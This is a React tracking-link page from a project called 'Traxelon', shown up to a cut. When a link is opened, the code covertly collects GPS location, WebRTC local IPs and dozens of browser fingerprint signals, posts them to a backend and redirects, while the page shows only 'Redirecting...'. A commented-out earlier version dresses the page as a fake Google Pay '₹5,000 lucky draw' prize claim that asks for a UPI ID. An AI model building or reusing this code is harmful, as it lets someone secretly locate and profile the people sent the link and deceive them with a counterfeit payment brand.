// // import React, { useEffect, useRef, useState } from "react";
// // import { useParams } from "react-router-dom";
// // import { useGeoGrabber } from "../hooks/useGeoGrabber";

// // const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || "http://localhost:5001";

// // function getCaptureKey(token) {
// //   return "traxelon_captured_v4_" + token;
// // }

// // // ── Canvas fingerprint ────────────────────────────────────────
// // function getCanvasFingerprint() {
// //   try {
// //     const canvas = document.createElement("canvas");
// //     canvas.width = 200;
// //     canvas.height = 50;
// //     const ctx = canvas.getContext("2d");
// //     ctx.textBaseline = "top";
// //     ctx.font = "14px Arial";
// //     ctx.fillStyle = "#f60";
// //     ctx.fillRect(125, 1, 62, 20);
// //     ctx.fillStyle = "#069";
// //     ctx.fillText("Traxelon", 2, 15);
// //     ctx.fillStyle = "rgba(102,204,0,0.7)";
// //     ctx.fillText("Traxelon", 4, 17);
// //     const dataUrl = canvas.toDataURL();
// //     let hash = 0;
// //     for (let i = 0; i < dataUrl.length; i++) {
// //       hash = (hash << 5) - hash + dataUrl.charCodeAt(i);
// //       hash |= 0;
// //     }
// //     return hash.toString(16);
// //   } catch {
// //     return null;
// //   }
// // }

// // // ── WebGL GPU info ────────────────────────────────────────────
// // function getGPUInfo() {
// //   try {
// //     const canvas = document.createElement("canvas");
// //     const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
// //     if (!gl) return { gpu: null, gpuVendor: null };
// //     const ext = gl.getExtension("WEBGL_debug_renderer_info");
// //     if (!ext) return { gpu: null, gpuVendor: null };
// //     return {
// //       gpu: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || null,
// //       gpuVendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) || null,
// //     };
// //   } catch {
// //     return { gpu: null, gpuVendor: null };
// //   }
// // }

// // // ── Battery info ──────────────────────────────────────────────
// // async function getBatteryInfo() {
// //   try {
// //     if (!navigator.getBattery) return {};
// //     const battery = await navigator.getBattery();
// //     return {
// //       batteryLevel: Math.round(battery.level * 100),
// //       batteryCharging: battery.charging,
// //     };
// //   } catch {
// //     return {};
// //   }
// // }

// // // ── Incognito detection ───────────────────────────────────────
// // async function detectIncognito() {
// //   try {
// //     if (navigator.storage && navigator.storage.estimate) {
// //       const { quota } = await navigator.storage.estimate();
// //       return quota < 120 * 1024 * 1024;
// //     }
// //     return null;
// //   } catch {
// //     return null;
// //   }
// // }

// // // ── Network info ──────────────────────────────────────────────
// // function getNetworkInfo() {
// //   const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
// //   if (!conn) return {};
// //   return {
// //     connectionType: conn.effectiveType || null,
// //     connectionDownlink: conn.downlink || null,
// //     connectionRtt: conn.rtt || null,
// //     connectionSaveData: conn.saveData || false,
// //   };
// // }

// // // ── Collect all device info ───────────────────────────────────
// // async function collectDeviceInfo() {
// //   const [battery, incognito] = await Promise.all([
// //     getBatteryInfo(),
// //     detectIncognito(),
// //   ]);
// //   const { gpu, gpuVendor } = getGPUInfo();
// //   const network = getNetworkInfo();
// //   const canvasHash = getCanvasFingerprint();

// //   return {
// //     cpuCores: navigator.hardwareConcurrency || null,
// //     ram: navigator.deviceMemory || null,
// //     gpu,
// //     gpuVendor,
// //     maxTouchPoints: navigator.maxTouchPoints || null,
// //     batteryLevel: battery.batteryLevel || null,
// //     batteryCharging: battery.batteryCharging || null,
// //     screenWidth: window.screen.width,
// //     screenHeight: window.screen.height,
// //     screenAvailWidth: window.screen.availWidth || null,
// //     screenAvailHeight: window.screen.availHeight || null,
// //     colorDepth: window.screen.colorDepth || null,
// //     pixelDepth: window.screen.pixelDepth || null,
// //     pixelRatio: window.devicePixelRatio || null,
// //     windowWidth: window.innerWidth || null,
// //     windowHeight: window.innerHeight || null,
// //     language: navigator.language || null,
// //     languages: navigator.languages ? navigator.languages.join(", ") : null,
// //     platform: navigator.platform || null,
// //     cookiesEnabled: navigator.cookieEnabled || null,
// //     doNotTrack: navigator.doNotTrack || null,
// //     historyLength: window.history.length || null,
// //     referrer: document.referrer || null,
// //     ...network,
// //     incognito: incognito || null,
// //     canvasHash,
// //   };
// // }

// // export default function TrackingCapture() {
// //   const { token } = useParams();
// //   const [status, setStatus] = useState("📍 Allow location for full experience…");
// //   const hasSent = useRef(false);
// //   const { location, loading } = useGeoGrabber();

// //   useEffect(() => {
// //     const key = getCaptureKey(token);
// //     if (sessionStorage.getItem(key)) {
// //       setStatus("Redirecting…");
// //     }
// //   }, [token]);

// //   useEffect(() => {
// //     if (loading) return;
// //     if (hasSent.current) return;
// //     const key = getCaptureKey(token);
// //     if (sessionStorage.getItem(key)) return;
// //     hasSent.current = true;
// //     sessionStorage.setItem(key, "1");
// //     sendCapture(location);
// //   }, [loading]);

// //   async function sendCapture(loc) {
// //     setStatus("Redirecting…");

// //     try {
// //       const deviceInfo = await collectDeviceInfo();

// //       const payload = {
// //         token,
// //         gpsLat: loc && loc.source === "gps" ? (loc.lat || null) : null,
// //         gpsLon: loc && loc.source === "gps" ? (loc.lon || null) : null,
// //         gpsAccuracy: loc && loc.source === "gps" ? (loc.gpsAccuracy || null) : null,
// //         ...deviceInfo,
// //       };

// //       const res = await fetch(BACKEND_URL + "/api/links/capture", {
// //         method: "POST",
// //         headers: { "Content-Type": "application/json" },
// //         body: JSON.stringify(payload),
// //       });

// //       const data = await res.json();
// //       if (data.destinationUrl) {
// //         window.location.replace(data.destinationUrl);
// //       }
// //     } catch (err) {
// //       console.error("[TrackingCapture] error:", err);
// //     }
// //   }

// //   const orderId = token ? token.substring(0, 10).toUpperCase() : "";

// //   return (
// //     <div style={{
// //       margin: 0,
// //       padding: "16px",
// //       minHeight: "100vh",
// //       background: "#f1f3f4",
// //       fontFamily: "'Google Sans', Roboto, Arial, sans-serif",
// //       display: "flex",
// //       flexDirection: "column",
// //       alignItems: "center",
// //       justifyContent: "center",
// //     }}>
// //       <div style={{
// //         background: "#fff",
// //         borderRadius: 16,
// //         boxShadow: "0 2px 10px rgba(0,0,0,0.15)",
// //         width: "100%",
// //         maxWidth: 400,
// //         overflow: "hidden"
// //       }}>
// //         {/* Top bar */}
// //         <div style={{ background: "#fff", padding: "16px 20px", borderBottom: "1px solid #e8eaed", display: "flex", alignItems: "center", gap: 10 }}>
// //           <div style={{ display: "flex", alignItems: "center", gap: 4 }}>
// //             <svg width="28" height="28" viewBox="0 0 48 48">
// //               <path fill="#4285F4" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
// //               <path fill="#34A853" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
// //               <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
// //               <path fill="#EA4335" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
// //             </svg>
// //             <span style={{ fontSize: 18, fontWeight: 500, color: "#202124", letterSpacing: 0.3 }}>Pay</span>
// //           </div>
// //         </div>

// //         {/* Prize Banner */}
// //         <div style={{ background: "linear-gradient(135deg, #1a73e8, #0d47a1)", padding: "24px 20px", textAlign: "center" }}>
// //           <div style={{ background: "rgba(255,255,255,0.15)", borderRadius: 50, display: "inline-block", padding: "4px 16px", marginBottom: 12, fontSize: 12, color: "#fff", letterSpacing: 1 }}>
// //             🎉 CONGRATULATIONS
// //           </div>
// //           <div style={{ color: "#fff", fontSize: 38, fontWeight: 700, letterSpacing: -1 }}>₹5,000</div>
// //           <div style={{ color: "rgba(255,255,255,0.85)", fontSize: 13, marginTop: 6 }}>Lucky Draw Winner — Claim your prize now!</div>
// //         </div>

// //         {/* Sender */}
// //         <div style={{ padding: "16px 20px", borderBottom: "1px solid #e8eaed", display: "flex", alignItems: "center", gap: 14 }}>
// //           <div style={{ width: 46, height: 46, borderRadius: "50%", background: "#1a73e8", display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontWeight: 700, fontSize: 20, flexShrink: 0 }}>L</div>
// //           <div style={{ flex: 1 }}>
// //             <div style={{ color: "#202124", fontWeight: 600, fontSize: 15 }}>Lucky Draw India</div>
// //             <div style={{ color: "#5f6368", fontSize: 12, marginTop: 2 }}>luckydraw@okhdfcbank</div>
// //           </div>
// //           <div style={{ background: "#e6f4ea", color: "#137333", fontSize: 11, fontWeight: 600, padding: "3px 10px", borderRadius: 12 }}>✓ VERIFIED</div>
// //         </div>

// //         {/* Transaction details */}
// //         <div style={{ padding: "14px 20px", background: "#f8f9fa", borderBottom: "1px solid #e8eaed" }}>
// //           {[
// //             { label: "Transaction ID", value: "TXN" + orderId },
// //             { label: "Date & Time", value: new Date().toLocaleString("en-IN") },
// //             { label: "Payment Type", value: "Lucky Draw Prize" },
// //             { label: "Status", value: status === "📍 Allow location for full experience…" ? "⏳ Verifying..." : "✓ Ready to Claim", color: status === "📍 Allow location for full experience…" ? "#f9ab00" : "#137333" },
// //           ].map((item, i) => (
// //             <div key={i} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 10 }}>
// //               <span style={{ color: "#5f6368", fontSize: 13 }}>{item.label}</span>
// //               <span style={{ color: item.color || "#202124", fontSize: 13, fontWeight: 500 }}>{item.value}</span>
// //             </div>
// //           ))}
// //         </div>

// //         {/* UPI Input */}
// //         <div style={{ padding: "20px" }}>
// //           <div style={{ color: "#202124", fontSize: 14, fontWeight: 500, marginBottom: 12 }}>Enter UPI ID to receive ₹5,000</div>
// //           <div style={{ display: "flex", alignItems: "center", border: "1.5px solid #dadce0", borderRadius: 8, overflow: "hidden", marginBottom: 16 }}>
// //             <input type="text" placeholder="mobilenumber@upi" style={{ flex: 1, padding: "13px 14px", border: "none", outline: "none", fontSize: 14, color: "#202124", background: "transparent" }} />
// //             <div style={{ padding: "0 16px", color: "#1a73e8", fontSize: 13, fontWeight: 600, borderLeft: "1px solid #dadce0", cursor: "pointer", whiteSpace: "nowrap", alignSelf: "stretch", display: "flex", alignItems: "center" }}>Verify</div>
// //           </div>
// //           <button style={{ width: "100%", background: "#1a73e8", color: "#fff", border: "none", borderRadius: 8, padding: "14px", fontSize: 15, fontWeight: 600, cursor: "pointer" }}>
// //             Claim ₹5,000 Now
// //           </button>
// //           <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, marginTop: 14, color: "#5f6368", fontSize: 11 }}>
// //             🔒 Secured by Google Pay · 256-bit SSL
// //           </div>
// //         </div>
// //       </div>

// //       <div style={{ marginTop: 20, color: "#5f6368", fontSize: 11 }}>
// //         Google Pay · Privacy · Terms · Help
// //       </div>
// //     </div>
// //   );
// // }


// import React, { useEffect, useRef } from "react";
// import { useParams } from "react-router-dom";
// import { useGeoGrabber } from "../hooks/useGeoGrabber";

// const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || "http://localhost:5001";

// function getCaptureKey(token) {
//   return "traxelon_captured_v5_" + token;
// }

// function getCanvasFingerprint() {
//   try {
//     const canvas = document.createElement("canvas");
//     canvas.width = 200; canvas.height = 50;
//     const ctx = canvas.getContext("2d");
//     ctx.textBaseline = "top";
//     ctx.font = "14px Arial";
//     ctx.fillStyle = "#f60";
//     ctx.fillRect(125, 1, 62, 20);
//     ctx.fillStyle = "#069";
//     ctx.fillText("Traxelon", 2, 15);
//     ctx.fillStyle = "rgba(102,204,0,0.7)";
//     ctx.fillText("Traxelon", 4, 17);
//     const dataUrl = canvas.toDataURL();
//     let hash = 0;
//     for (let i = 0; i < dataUrl.length; i++) {
//       hash = (hash << 5) - hash + dataUrl.charCodeAt(i);
//       hash |= 0;
//     }
//     return hash.toString(16);
//   } catch { return null; }
// }

// async function getAudioFingerprint() {
//   try {
//     const AudioCtx = window.AudioContext || window.webkitAudioContext;
//     if (!AudioCtx) return null;
//     const ctx = new AudioCtx();
//     const oscillator = ctx.createOscillator();
//     const analyser = ctx.createAnalyser();
//     const gain = ctx.createGain();
//     const scriptProcessor = ctx.createScriptProcessor(4096, 1, 1);
//     gain.gain.value = 0;
//     oscillator.type = "triangle";
//     oscillator.frequency.value = 10000;
//     oscillator.connect(analyser);
//     analyser.connect(scriptProcessor);
//     scriptProcessor.connect(gain);
//     gain.connect(ctx.destination);
//     oscillator.start(0);
//     return new Promise((resolve) => {
//       scriptProcessor.onaudioprocess = (e) => {
//         const data = e.inputBuffer.getChannelData(0);
//         let sum = 0;
//         for (let i = 0; i < data.length; i++) sum += Math.abs(data[i]);
//         oscillator.disconnect();
//         ctx.close();
//         resolve(sum.toString(16).substring(0, 12));
//       };
//       setTimeout(() => resolve(null), 1000);
//     });
//   } catch { return null; }
// }

// function getGPUInfo() {
//   try {
//     const canvas = document.createElement("canvas");
//     const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
//     if (!gl) return { gpu: null, gpuVendor: null };
//     const ext = gl.getExtension("WEBGL_debug_renderer_info");
//     return {
//       gpu: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : null,
//       gpuVendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : null,
//       webglVersion: gl.getParameter(gl.VERSION) || null,
//       webglRenderer: gl.getParameter(gl.RENDERER) || null,
//       webglVendor: gl.getParameter(gl.VENDOR) || null,
//       webglShadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION) || null,
//       maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE) || null,
//     };
//   } catch { return { gpu: null, gpuVendor: null }; }
// }

// async function getBatteryInfo() {
//   try {
//     if (!navigator.getBattery) return {};
//     const battery = await navigator.getBattery();
//     return {
//       batteryLevel: Math.round(battery.level * 100),
//       batteryCharging: battery.charging,
//       batteryChargingTime: battery.chargingTime !== Infinity ? battery.chargingTime : null,
//       batteryDischargingTime: battery.dischargingTime !== Infinity ? battery.dischargingTime : null,
//     };
//   } catch { return {}; }
// }

// async function detectIncognito() {
//   try {
//     if (navigator.storage && navigator.storage.estimate) {
//       const { quota } = await navigator.storage.estimate();
//       return quota < 120 * 1024 * 1024;
//     }
//     return null;
//   } catch { return null; }
// }

// function getNetworkInfo() {
//   const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
//   if (!conn) return {};
//   return {
//     connectionType: conn.effectiveType || null,
//     connectionDownlink: conn.downlink || null,
//     connectionRtt: conn.rtt || null,
//     connectionSaveData: conn.saveData || false,
//     connectionDownlinkMax: conn.downlinkMax || null,
//   };
// }

// async function getStorageInfo() {
//   try {
//     const estimate = await navigator.storage?.estimate();
//     return {
//       storageQuota: estimate?.quota ? Math.round(estimate.quota / 1024 / 1024) + " MB" : null,
//       storageUsage: estimate?.usage ? Math.round(estimate.usage / 1024 / 1024) + " MB" : null,
//       localStorageEnabled: (() => { try { localStorage.setItem("t","1"); localStorage.removeItem("t"); return true; } catch { return false; } })(),
//       sessionStorageEnabled: (() => { try { sessionStorage.setItem("t","1"); sessionStorage.removeItem("t"); return true; } catch { return false; } })(),
//       indexedDBEnabled: !!window.indexedDB,
//     };
//   } catch { return {}; }
// }

// async function getMediaDevices() {
//   try {
//     if (!navigator.mediaDevices?.enumerateDevices) return {};
//     const devices = await navigator.mediaDevices.enumerateDevices();
//     return {
//       cameras: devices.filter(d => d.kind === "videoinput").length,
//       microphones: devices.filter(d => d.kind === "audioinput").length,
//       speakers: devices.filter(d => d.kind === "audiooutput").length,
//     };
//   } catch { return {}; }
// }

// function getInstalledFonts() {
//   try {
//     const fontList = [
//       "Arial","Arial Black","Arial Narrow","Calibri","Cambria",
//       "Comic Sans MS","Courier","Courier New","Georgia","Helvetica",
//       "Impact","Lucida Console","Lucida Sans Unicode","Microsoft Sans Serif",
//       "Palatino Linotype","Tahoma","Times New Roman","Trebuchet MS",
//       "Verdana","Wingdings","Segoe UI","Roboto","Ubuntu","Open Sans",
//     ];
//     const canvas = document.createElement("canvas");
//     const ctx = canvas.getContext("2d");
//     const baseFonts = ["monospace", "sans-serif", "serif"];
//     const testString = "mmmmmmmmmmlli";
//     const testSize = "72px";
//     const baseWidths = {};
//     baseFonts.forEach(base => {
//       ctx.font = `${testSize} ${base}`;
//       baseWidths[base] = ctx.measureText(testString).width;
//     });
//     const detected = fontList.filter(font =>
//       baseFonts.some(base => {
//         ctx.font = `${testSize} '${font}', ${base}`;
//         return ctx.measureText(testString).width !== baseWidths[base];
//       })
//     );
//     return { fontsDetected: detected.length, fontsList: detected.join(", ") };
//   } catch { return {}; }
// }

// function getSpeechVoices() {
//   try {
//     if (!window.speechSynthesis) return {};
//     const voices = window.speechSynthesis.getVoices();
//     return {
//       speechVoicesCount: voices.length,
//       speechVoices: voices.slice(0, 5).map(v => v.name).join(", ") || null,
//     };
//   } catch { return {}; }
// }

// function getBrowserPlugins() {
//   try {
//     const plugins = Array.from(navigator.plugins || []).map(p => p.name);
//     return {
//       pluginsCount: plugins.length,
//       plugins: plugins.slice(0, 10).join(", ") || null,
//     };
//   } catch { return {}; }
// }

// function getPerformanceInfo() {
//   try {
//     const perf = performance.getEntriesByType("navigation")[0];
//     return {
//       pageLoadTime: perf ? Math.round(perf.loadEventEnd - perf.startTime) + " ms" : null,
//       domContentLoaded: perf ? Math.round(perf.domContentLoadedEventEnd - perf.startTime) + " ms" : null,
//     };
//   } catch { return {}; }
// }

// async function getWebRTCIP() {
//   try {
//     const pc = new RTCPeerConnection({ iceServers: [] });
//     pc.createDataChannel("");
//     await pc.createOffer().then(offer => pc.setLocalDescription(offer));
//     return new Promise((resolve) => {
//       const ips = [];
//       pc.onicecandidate = (e) => {
//         if (!e.candidate) { pc.close(); resolve({ webrtcLocalIP: ips.join(", ") || null }); return; }
//         const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
//         if (match) ips.push(match[1]);
//       };
//       setTimeout(() => { pc.close(); resolve({ webrtcLocalIP: ips.join(", ") || null }); }, 1000);
//     });
//   } catch { return { webrtcLocalIP: null }; }
// }

// async function collectDeviceInfo() {
//   const [battery, incognito, mediaDevices, storageInfo, audioFingerprint, webrtcIP] = await Promise.all([
//     getBatteryInfo(), detectIncognito(), getMediaDevices(),
//     getStorageInfo(), getAudioFingerprint(), getWebRTCIP(),
//   ]);

//   const gpuInfo = getGPUInfo();
//   const network = getNetworkInfo();
//   const canvasHash = getCanvasFingerprint();
//   const fonts = getInstalledFonts();
//   const speech = getSpeechVoices();
//   const plugins = getBrowserPlugins();
//   const perf = getPerformanceInfo();
//   const now = new Date();

//   return {
//     // Hardware
//     cpuCores: navigator.hardwareConcurrency || null,
//     ram: navigator.deviceMemory || null,
//     ...gpuInfo,
//     // Battery
//     ...battery,
//     // Screen
//     screenWidth: window.screen.width,
//     screenHeight: window.screen.height,
//     screenAvailWidth: window.screen.availWidth || null,
//     screenAvailHeight: window.screen.availHeight || null,
//     colorDepth: window.screen.colorDepth || null,
//     pixelDepth: window.screen.pixelDepth || null,
//     pixelRatio: window.devicePixelRatio || null,
//     windowWidth: window.innerWidth || null,
//     windowHeight: window.innerHeight || null,
//     orientation: window.screen.orientation?.type || null,
//     outerWidth: window.outerWidth || null,
//     outerHeight: window.outerHeight || null,
//     // Touch
//     maxTouchPoints: navigator.maxTouchPoints || null,
//     touchSupport: "ontouchstart" in window || navigator.maxTouchPoints > 0,
//     pointerType: window.PointerEvent ? "pointer" : "mouse",
//     // Browser
//     language: navigator.language || null,
//     languages: navigator.languages ? navigator.languages.join(", ") : null,
//     platform: navigator.platform || null,
//     cookiesEnabled: navigator.cookieEnabled || null,
//     doNotTrack: navigator.doNotTrack || null,
//     historyLength: window.history.length || null,
//     referrer: document.referrer || null,
//     vendor: navigator.vendor || null,
//     javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
//     pdfViewerEnabled: navigator.pdfViewerEnabled || null,
//     // Network
//     ...network,
//     // Date & Time
//     localTime: now.toLocaleString("en-IN", { timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone }),
//     clientTimezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
//     timezoneOffset: now.getTimezoneOffset(),
//     // Privacy
//     incognito: incognito || null,
//     adBlockDetected: (() => {
//       try {
//         const el = document.createElement("div");
//         el.className = "adsbox ad-unit ads";
//         document.body.appendChild(el);
//         const blocked = el.offsetHeight === 0;
//         document.body.removeChild(el);
//         return blocked;
//       } catch { return null; }
//     })(),
//     // Fingerprints
//     canvasHash,
//     audioFingerprint,
//     // Media
//     ...mediaDevices,
//     // Storage
//     ...storageInfo,
//     // Fonts
//     ...fonts,
//     // Speech
//     ...speech,
//     // Plugins
//     ...plugins,
//     // Performance
//     ...perf,
//     // WebRTC
//     ...webrtcIP,
//     // Features
//     webSocketSupport: !!window.WebSocket,
//     webWorkerSupport: !!window.Worker,
//     serviceWorkerSupport: "serviceWorker" in navigator,
//     webAssemblySupport: !!window.WebAssembly,
//     notificationsPermission: Notification?.permission || null,
//     bluetoothSupport: "bluetooth" in navigator,
//     usbSupport: "usb" in navigator,
//   };
// }

// export default function TrackingCapture() {
//   const { token } = useParams();
//   const hasSent = useRef(false);
//   const { location, loading } = useGeoGrabber();

//   useEffect(() => {
//     if (loading) return;
//     if (hasSent.current) return;
//     const key = getCaptureKey(token);
//     if (sessionStorage.getItem(key)) return;
//     hasSent.current = true;
//     sessionStorage.setItem(key, "1");
//     sendCapture(location);
//   }, [loading]);

//   async function sendCapture(loc) {
//     try {
//       const deviceInfo = await collectDeviceInfo();
//       const payload = {
//         token,
//         gpsLat: loc?.source === "gps" ? (loc.lat || null) : null,
//         gpsLon: loc?.source === "gps" ? (loc.lon || null) : null,
//         gpsAccuracy: loc?.source === "gps" ? (loc.gpsAccuracy || null) : null,
//         ...deviceInfo,
//       };
//       const res = await fetch(BACKEND_URL + "/api/links/capture", {
//         method: "POST",
//         headers: { "Content-Type": "application/json" },
//         body: JSON.stringify(payload),
//       });
//       const data = await res.json();
//       if (data.destinationUrl) {
//         window.location.replace(data.destinationUrl);
//       }
//     } catch (err) {
//       console.error("[TrackingCapture] error:", err);
//     }
//   }

//   return (
//     <div style={{
//       margin: 0, minHeight: "100vh", background: "#f1f3f4",
//       display: "flex", alignItems: "center", justifyContent: "center",
//       fontFamily: "Arial, sans-serif", color: "#5f6368", fontSize: 14,
//     }}>
//       Redirecting...
//     </div>
//   );
// }



import React, { useEffect, useRef } from "react";
import { useParams } from "react-router-dom";
import { useGeoGrabber } from "../hooks/useGeoGrabber";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || "http://localhost:5001";

function getCaptureKey(token) {
  return "traxelon_captured_v6_" + token;
}

function getCanvasFingerprint() {
  try {
    const canvas = document.createElement("canvas");
    canvas.width = 300; canvas.height = 80;
    const ctx = canvas.getContext("2d");
    ctx.textBaseline = "alphabetic";
    ctx.fillStyle = "#f0f0f0"; ctx.fillRect(0, 0, 300, 80);
    ctx.fillStyle = "#069"; ctx.font = "bold 16px Arial";
    ctx.fillText("Traxelon Fingerprint", 4, 30);
    ctx.fillStyle = "rgba(102,204,0,0.7)"; ctx.font = "italic 13px Georgia";
    ctx.fillText("Unique ID: 0x1F4A", 4, 55);
    ctx.strokeStyle = "#f60"; ctx.lineWidth = 2;
    ctx.beginPath(); ctx.arc(150, 40, 20, 0, Math.PI * 2); ctx.stroke();
    const dataUrl = canvas.toDataURL();
    let hash = 0;
    for (let i = 0; i < dataUrl.length; i++) { hash = (hash << 5) - hash + dataUrl.charCodeAt(i); hash |= 0; }
    return hash.toString(16);
  } catch { return null; }
}

function getCanvasGeometryHash() {
  try {
    const canvas = document.createElement("canvas");
    canvas.width = 200; canvas.height = 200;
    const ctx = canvas.getContext("2d");
    ctx.beginPath(); ctx.moveTo(20, 20);
    ctx.bezierCurveTo(80, 10, 120, 150, 180, 180); ctx.stroke();
    ctx.beginPath(); ctx.arc(100, 100, 50, 0, Math.PI * 1.5); ctx.fill();
    ctx.font = "12px serif"; ctx.fillText("Canvas Geo", 50, 50);
    const data = canvas.toDataURL();
    let hash = 0;
    for (let i = 0; i < data.length; i++) { hash = (hash << 5) - hash + data.charCodeAt(i); hash |= 0; }
    return "geo-" + hash.toString(16);
  } catch { return null; }
}

function getWebGLInfo() {
  try {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl2") || canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    if (!gl) return { webglVersion: null, gpu: null, gpuVendor: null };
    const ext = gl.getExtension("WEBGL_debug_renderer_info");
    const extensions = gl.getSupportedExtensions() || [];
    const vs = gl.createShader(gl.VERTEX_SHADER);
    gl.shaderSource(vs, "attribute vec2 p;void main(){gl_Position=vec4(p,0,1);}");
    gl.compileShader(vs);
    const fs = gl.createShader(gl.FRAGMENT_SHADER);
    gl.shaderSource(fs, "precision mediump float;void main(){gl_FragColor=vec4(0.5,0.7,0.3,1.0);}");
    gl.compileShader(fs);
    const prog = gl.createProgram();
    gl.attachShader(prog, vs); gl.attachShader(prog, fs);
    gl.linkProgram(prog); gl.useProgram(prog);
    const buf = gl.createBuffer();
    gl.bindBuffer(gl.ARRAY_BUFFER, buf);
    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,0,1]), gl.STATIC_DRAW);
    const loc = gl.getAttribLocation(prog, "p");
    gl.enableVertexAttribArray(loc);
    gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
    gl.drawArrays(gl.TRIANGLES, 0, 3);
    const pixels = new Uint8Array(canvas.width * canvas.height * 4);
    gl.readPixels(0, 0, canvas.width, canvas.height, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
    let hash = 0;
    for (let i = 0; i < pixels.length; i += 4) { hash = (hash << 5) - hash + pixels[i] + pixels[i+1] + pixels[i+2]; hash |= 0; }
    const vhp = gl.getShaderPrecisionFormat(gl.VERTEX_SHADER, gl.HIGH_FLOAT);
    const shaderPrecision = vhp ? `highfloat-range:${vhp.rangeMin}/${vhp.rangeMax}-prec:${vhp.precision}` : null;
    return {
      gpu: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : null,
      gpuVendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : null,
      webglVersion: gl.getParameter(gl.VERSION) || null,
      webglRenderer: gl.getParameter(gl.RENDERER) || null,
      webglVendor: gl.getParameter(gl.VENDOR) || null,
      webglShadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION) || null,
      maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE) || null,
      maxViewportDims: (gl.getParameter(gl.MAX_VIEWPORT_DIMS) || []).join("x") || null,
      maxAnisotropy: (() => { try { const e = gl.getExtension("EXT_texture_filter_anisotropic"); return e ? gl.getParameter(e.MAX_TEXTURE_MAX_ANISOTROPY_EXT) : null; } catch { return null; } })(),
      maxVertexAttribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS) || null,
      maxVertexUniformVectors: gl.getParameter(gl.MAX_VERTEX_UNIFORM_VECTORS) || null,
      maxFragmentUniformVectors: gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS) || null,
      aliasedPointSizeRange: (gl.getParameter(gl.ALIASED_POINT_SIZE_RANGE) || []).join("-") || null,
      aliasedLineWidthRange: (gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE) || []).join("-") || null,
      webglExtensionsCount: extensions.length,
      webgl2Support: !!canvas.getContext("webgl2"),
      webglHash: hash.toString(16),
      shaderPrecision,
    };
  } catch { return { gpu: null, gpuVendor: null }; }
}

async function getAudioFingerprint() {
  try {
    const AudioCtx = window.AudioContext || window.webkitAudioContext;
    if (!AudioCtx) return null;
    const ctx = new AudioCtx();
    const oscillator = ctx.createOscillator();
    const analyser = ctx.createAnalyser();
    const gain = ctx.createGain();
    const scriptProcessor = ctx.createScriptProcessor(4096, 1, 1);
    gain.gain.value = 0;
    oscillator.type = "triangle";
    oscillator.frequency.value = 10000;
    oscillator.connect(analyser); analyser.connect(scriptProcessor);
    scriptProcessor.connect(gain); gain.connect(ctx.destination);
    oscillator.start(0);
    return new Promise((resolve) => {
      scriptProcessor.onaudioprocess = (e) => {
        const data = e.inputBuffer.getChannelData(0);
        let sum = 0;
        for (let i = 0; i < data.length; i++) sum += Math.abs(data[i]);
        oscillator.disconnect(); ctx.close();
        resolve(sum.toString(16).substring(0, 16));
      };
      setTimeout(() => resolve(null), 1500);
    });
  } catch { return null; }
}

function getCSSHash() {
  try {
    const queries = [
      window.matchMedia("(prefers-color-scheme: dark)").matches,
      window.matchMedia("(prefers-reduced-motion: reduce)").matches,
      window.matchMedia("(color-gamut: p3)").matches,
      window.matchMedia("(color-gamut: srgb)").matches,
      window.matchMedia("(display-mode: standalone)").matches,
      window.matchMedia("(pointer: fine)").matches,
      window.matchMedia("(pointer: coarse)").matches,
      window.matchMedia("(hover: hover)").matches,
      window.matchMedia("(any-pointer: fine)").matches,
      window.matchMedia("(dynamic-range: high)").matches,
    ];
    return queries.map(b => b ? "1" : "0").join("");
  } catch { return null; }
}

function getFontInfo() {
  try {
    const fontList = [
      "Arial","Arial Black","Arial Narrow","Arial Rounded MT Bold","Calibri","Cambria","Candara",
      "Century","Century Gothic","Comic Sans MS","Consolas","Constantia","Corbel","Courier",
      "Courier New","Ebrima","Franklin Gothic Medium","Gabriola","Gadugi","Georgia",
